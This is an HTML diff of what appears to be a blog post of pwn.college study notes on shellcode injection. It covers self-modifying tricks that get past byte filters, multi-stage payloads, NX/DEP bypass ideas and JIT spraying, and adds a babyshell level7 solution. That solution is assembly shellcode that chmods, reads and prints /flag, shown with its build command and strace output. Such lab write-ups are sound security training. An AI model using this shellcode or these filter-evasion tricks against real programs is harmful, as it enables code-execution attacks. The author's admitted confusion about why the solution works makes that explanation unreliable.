@@ -319,7 +319,7 @@
 
 
                 <time class="article-time--reading">
-                    9 minute read
+                    13 minute read
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -330,7 +330,7 @@
 
 
                 <time class="article-words">
-                    1880 字
+                    2655 字
                 </time>
             </div>
         
@@ -659,6 +659,115 @@
 	
 ></p>
 <p><strong>shl: Logical left shift instruction</strong></p>
+<p>if the constraints on shellcode are too hard to get around with clever synonyms, but the page where your shellcode is mapped is writable. remember, <strong>code == data</strong></p>
+<p>for example, forbiddent the <code>int 3</code> which is 0xcc in binary, and we can do like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">inc BYTE PTR [rip] #rip is pointed to next instruction
+</span></span><span class="line"><span class="cl">.byte 0xcb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>when testing this, we need to make sure .text is writable:</p>
+<blockquote>
+<p>gcc <strong>-Wl, -N  &ndash;static</strong> -nostdlib -o shellcode shellcode.s</p>
+</blockquote>
+<p>③ multi-stage shellcode</p>
+<p><strong>stage 1:</strong> read(0, rip, 1000)</p>
+<ul>
+<li>On amd64, we can do ti with <strong>lea rax, [rip]</strong></li>
+</ul>
+<p><strong>stage 2:</strong> whatever you want</p>
+<p>④Useful Tools</p>
+<p><a class="link" href="https://github.com/Gallopsled/pwntools"  target="_blank" rel="noopener"
+    >pwntools</a>: a library for writing exploits (and shellcode)</p>
+<p><a class="link" href="https://github.com/yrp604/rappel"  target="_blank" rel="noopener"
+    >rappel</a>: lets you explore the effects of instructions</p>
+<p><a class="link" href="http://ref.x86asm.net/coder64.html"  target="_blank" rel="noopener"
+    >amd64 opcode listing</a></p>
+<p>some gdb plugins: <a class="link" href="https://github.com/scwuaptx/Pwngdb"  target="_blank" rel="noopener"
+    >Pwngdb</a>, <a class="link" href="https://github.com/pwndbg/pwndbg"  target="_blank" rel="noopener"
+    >pwndbg</a>, <a class="link" href="https://github.com/longld/peda"  target="_blank" rel="noopener"
+    >peda</a>&hellip;</p>
+<h2 id="shellcode-injection-data-execution-prevention">Shellcode Injection: Data Execution Prevention</h2>
+<p>①memory permissions</p>
+<ul>
+<li><strong>PROT_READ:</strong> allow the process to read memory</li>
+<li><strong>PROT_WRITE:</strong> allow the process to write memory</li>
+<li><strong>PROT_EXEC:</strong> allow the process to execute memory</li>
+</ul>
+<p>Intuition: all code is located in .text segments of the loaded ELF files. There&rsquo;s no need to execute code located on the stack or in the heap. By default in modern systems, the stack and the heap are not executable. (NX: no-execute bit)</p>
+<p>②de-protecting memory</p>
+<p>Memory can be made executable using the <strong>mprotect() system call</strong>:</p>
+<ul>
+<li>Trick the program into mprotect(PROT_EXEC)ing our shellcode
+<ul>
+<li>code reuse through <strong>Return Oriented Programming</strong></li>
+</ul>
+</li>
+<li>Jump to the shellcode</li>
+</ul>
+<p>③JIT</p>
+<p><img src="/p/pwncollege_note6/index.assets/image-20230311174455341.png"
+	width="1612"
+	height="652"
+	srcset="/p/pwncollege_note6/index.assets/image-20230311174455341_hue340cdd4638184ddcdfaa51806e381be_374214_480x0_resize_box_3.png 480w, /p/pwncollege_note6/index.assets/image-20230311174455341_hue340cdd4638184ddcdfaa51806e381be_374214_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p><img src="/p/pwncollege_note6/index.assets/image-20230311174814275.png"
+	width="1284"
+	height="517"
+	srcset="/p/pwncollege_note6/index.assets/image-20230311174814275_hu205ddcd67551607c4b1a8311124f2051_43331_480x0_resize_box_3.png 480w, /p/pwncollege_note6/index.assets/image-20230311174814275_hu205ddcd67551607c4b1a8311124f2051_43331_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="596px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">cd</span> /proc <span class="c1">#there we have directories for all the processes running on machine</span>
+</span></span><span class="line"><span class="cl">cat self/maps <span class="c1">#self is a link to my current process id</span>
+</span></span><span class="line"><span class="cl">ls -ld self
+</span></span><span class="line"><span class="cl">grep -l rwx */maps <span class="c1">#see files that match these permissions</span>
+</span></span><span class="line"><span class="cl">grep -l rwx */maps <span class="p">|</span> parallel <span class="s2">&#34;ls -l {//}/exe&#34;</span> <span class="c1">#get the xxx/exe and all of the programs have a page mapped in memory that is writable and executable.</span>
+</span></span><span class="line"><span class="cl">cat xxx/maps 
+</span></span><span class="line"><span class="cl">grep rwx xxx/maps
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>shellcode injection technique: JIT spraying</p>
+<p><img src="/p/pwncollege_note6/index.assets/image-20230311194659606.png"
+	width="1271"
+	height="142"
+	srcset="/p/pwncollege_note6/index.assets/image-20230311194659606_hueaa21eaaa9dd4ac1f8b8eb3e86d80dea_27024_480x0_resize_box_3.png 480w, /p/pwncollege_note6/index.assets/image-20230311194659606_hueaa21eaaa9dd4ac1f8b8eb3e86d80dea_27024_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="895"
+		data-flex-basis="2148px"
+	
+></p>
 <h2 id="babyshell">babyshell</h2>
 <p><strong>code injection</strong>	=&gt; This challenge reads in some bytes, modifies them , and executes them as code! Shellcode will be copied onto the stack and executed. Since the stack location is randomized on every execution, your shellcode will need to be <em>position-independent</em>.</p>
 <p>level1: <strong>Placing shellcode on the stack at 0x123456789abc; Write and execute shellcode to read the flag</strong></p>
@@ -1242,6 +1351,233 @@ actual functionality of your code begins. When control flow hits any of these in
 </div>
 </div><p>level6: <strong>Removing write permissions from first 4096 bytes of shellcode</strong></p>
 <p>In order to get the flag, just directly add 4096 repeats in the front of the level5 code</p>
+<p>level7: <strong>close the stdin, stderr, stdout</strong></p>
+<p>This challenge is about to close</p>
+<ul>
+<li><strong>stdin</strong>, which means that it will be harder to pass in a stage-2 shellcode. You will need to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.</li>
+<li><strong>stderr</strong>, which means that you will not be able to get use file descriptor 2 for output.</li>
+<li><strong>stdout</strong>, which means that you will not be able to get use file descriptor 1 for output. You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#use the chmod to make the flag file can be read</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#A permission of 004 corresponds to -------r--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">- --- --- ---
+</span></span><span class="line"><span class="cl">-:- or d <span class="o">(</span>file <span class="nb">type</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">1---: owner
+</span></span><span class="line"><span class="cl">2---: group
+</span></span><span class="line"><span class="cl">3---: other users
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> each ---: rwx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>this table is about the permission:</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>#</th>
+<th>permission</th>
+<th>rwx</th>
+<th>binary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7</td>
+<td>read + write + execute</td>
+<td>rwx</td>
+<td>111</td>
+</tr>
+<tr>
+<td>6</td>
+<td>read + write</td>
+<td>rw-</td>
+<td>110</td>
+</tr>
+<tr>
+<td>5</td>
+<td>read + execute</td>
+<td>r-x</td>
+<td>101</td>
+</tr>
+<tr>
+<td>4</td>
+<td>read</td>
+<td>r&ndash;</td>
+<td>100</td>
+</tr>
+<tr>
+<td>3</td>
+<td>write + execute</td>
+<td>-wx</td>
+<td>011</td>
+</tr>
+<tr>
+<td>2</td>
+<td>write</td>
+<td>-w-</td>
+<td>010</td>
+</tr>
+<tr>
+<td>1</td>
+<td>execute</td>
+<td>&ndash;x</td>
+<td>001</td>
+</tr>
+<tr>
+<td>0</td>
+<td>none</td>
+<td>&mdash;</td>
+<td>000</td>
+</tr>
+</tbody>
+</table></div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.global _start
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">.intel_syntax noprefix
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	#chmod
+</span></span><span class="line"><span class="cl">	mov rax, 90
+</span></span><span class="line"><span class="cl">	lea rdi, [rip+flag]
+</span></span><span class="line"><span class="cl">	mov rsi, 4 #other users can read the flag
+</span></span><span class="line"><span class="cl">	#mov rsi, 777
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	#open
+</span></span><span class="line"><span class="cl">	xor rsi, rsi
+</span></span><span class="line"><span class="cl">	lea rdi, [rip+flag]
+</span></span><span class="line"><span class="cl">	xor rax, rax
+</span></span><span class="line"><span class="cl">	mov al, 2
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	#read
+</span></span><span class="line"><span class="cl">	mov rdi, rax
+</span></span><span class="line"><span class="cl">	mov rsi, rsp
+</span></span><span class="line"><span class="cl">	xor rdx, rdx
+</span></span><span class="line"><span class="cl">	mov dl, 100
+</span></span><span class="line"><span class="cl">	xor rax, rax
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	#write
+</span></span><span class="line"><span class="cl">	xor rdi, rdi
+</span></span><span class="line"><span class="cl">	mov dil, 1
+</span></span><span class="line"><span class="cl">	mov rsi, rsp
+</span></span><span class="line"><span class="cl">	mov rdx, rax
+</span></span><span class="line"><span class="cl">	xor rax, rax
+</span></span><span class="line"><span class="cl">	mov al, 1
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	#exit
+</span></span><span class="line"><span class="cl">	xor rax, rax
+</span></span><span class="line"><span class="cl">	mov al, 60
+</span></span><span class="line"><span class="cl">	xor rdi, rdi
+</span></span><span class="line"><span class="cl">	mov dil, 42
+</span></span><span class="line"><span class="cl">	syscall
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">flag:
+</span></span><span class="line"><span class="cl">	.ascii &#34;/flag&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#============================using in shell</span>
+</span></span><span class="line"><span class="cl">gcc -nostdlib -static -o <span class="m">1</span> 1.s <span class="o">&amp;&amp;</span> objcopy --dump-section .text<span class="o">=</span>out <span class="m">1</span> <span class="o">&amp;&amp;</span> cat out <span class="p">|</span> strace /challenge/babyshell_level7
+</span></span><span class="line"><span class="cl">strace ./1 <span class="c1">#get the flag like this:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">execve<span class="o">(</span><span class="s2">&#34;./1&#34;</span>, <span class="o">[</span><span class="s2">&#34;./1&#34;</span><span class="o">]</span>, 0x7fff5cd94da0 /* <span class="m">25</span> vars */<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">chmod<span class="o">(</span><span class="s2">&#34;/flag&#34;</span>, 004<span class="o">)</span>                     <span class="o">=</span> -1 EPERM <span class="o">(</span>Operation not permitted<span class="o">)</span>
+</span></span><span class="line"><span class="cl">open<span class="o">(</span><span class="s2">&#34;/flag&#34;</span>, O_RDONLY<span class="o">)</span>                 <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">read<span class="o">(</span>3, <span class="s2">&#34;pwn.college{a&#34;</span>..., 100<span class="o">)</span> <span class="o">=</span> <span class="m">56</span>
+</span></span><span class="line"><span class="cl">write<span class="o">(</span>1, <span class="s2">&#34;pwn.college{a&#34;</span>..., 56pwn.college<span class="o">{</span>a<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">)</span> <span class="o">=</span> <span class="m">56</span>
+</span></span><span class="line"><span class="cl">exit<span class="o">(</span>42<span class="o">)</span>                                <span class="o">=</span> ?
+</span></span><span class="line"><span class="cl">+++ exited with <span class="m">42</span> +++
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#============================or just</span>
+</span></span><span class="line"><span class="cl">./1 <span class="c1">#can get the flag</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Actually I still don&rsquo;t know why the stderr, stdout, stdin which were being closed work and why the <code>chmod</code> command can solve this question. I just know it is a way to be able to cat the flag</strong></p>
+</blockquote>
 
 </section>
 
@@ -1461,7 +1797,7 @@ actual functionality of your code begins. When control flow hits any of these in
         
             
         
-        共 18.26k 字 · 共 10篇文章
+        共 19.04k 字 · 共 10篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -1659,6 +1995,7 @@ actual functionality of your code begins. When control flow hits any of these in
   <ol>
     <li><a href="#shellcode-injection-introduction">Shellcode Injection: Introduction</a></li>
     <li><a href="#shellcode-injection-common-challenges">Shellcode Injection: Common Challenges</a></li>
+    <li><a href="#shellcode-injection-data-execution-prevention">Shellcode Injection: Data Execution Prevention</a></li>
     <li><a href="#babyshell">babyshell</a></li>
   </ol>
 </nav>
